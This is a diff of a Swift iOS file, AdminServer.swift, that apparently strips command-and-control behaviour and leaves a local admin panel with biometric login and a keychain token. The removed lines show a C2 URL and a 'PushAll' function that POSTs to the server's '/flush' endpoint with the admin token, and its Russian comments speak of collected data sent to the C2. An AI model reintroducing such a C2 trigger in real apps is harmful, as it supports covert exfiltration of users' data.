@@ -1,26 +1,27 @@
-// language: Swift, file: AdminServer.swift
+// language: Swift, file: AdminServer.swift, target: iOS 15+
+// безсерверная версия — только локальные операции
+
 import Foundation
 import LocalAuthentication
 import Security
+import UIKit
 
 final class AdminServer {
     static let shared = AdminServer()
 
-    // Токен админа хранится в Keychain, доступен только после биометрии.
     private let adminTokenKey = "ipa.admin.token"
-    private let c2URL = URL(string: "https://your-domain.example/api")!
 
     func handle(action: String, completion: @escaping ([String: Any]) -> Void) {
         switch action {
         case "OpenPanel":
             authenticate { ok in
-                completion(["admin": ok, "token": ok ? self.loadToken() ?? "" : ""])
+                completion([
+                    "admin": ok,
+                    "token": ok ? (self.loadToken() ?? "local") : ""
+                ])
             }
-        case "PushAll":
-            // отправить всё собранное на C2
-            pushAll { completion(["status": "sent"]) }
         case "Wipe":
-            clearKeychain()
+            clearToken()
             completion(["status": "wiped"])
         default:
             completion([:])
@@ -57,19 +58,11 @@ final class AdminServer {
         SecItemAdd(q as CFDictionary, nil)
     }
 
-    private func clearKeychain() {
+    private func clearToken() {
         let q: [String: Any] = [
             kSecClass as String: kSecClassGenericPassword,
             kSecAttrAccount as String: adminTokenKey
         ]
         SecItemDelete(q as CFDictionary)
-    }
-
-    private func pushAll(_ cb: @escaping () -> Void) {
-        // собранные данные уже на C2 (см. index.html), здесь просто триггер
-        var req = URLRequest(url: c2URL.appendingPathComponent("flush"))
-        req.httpMethod = "POST"
-        req.setValue("Bearer \(loadToken() ?? "")", forHTTPHeaderField: "Authorization")
-        URLSession.shared.dataTask(with: req) { _, _, _ in cb() }.resume()
     }
 }
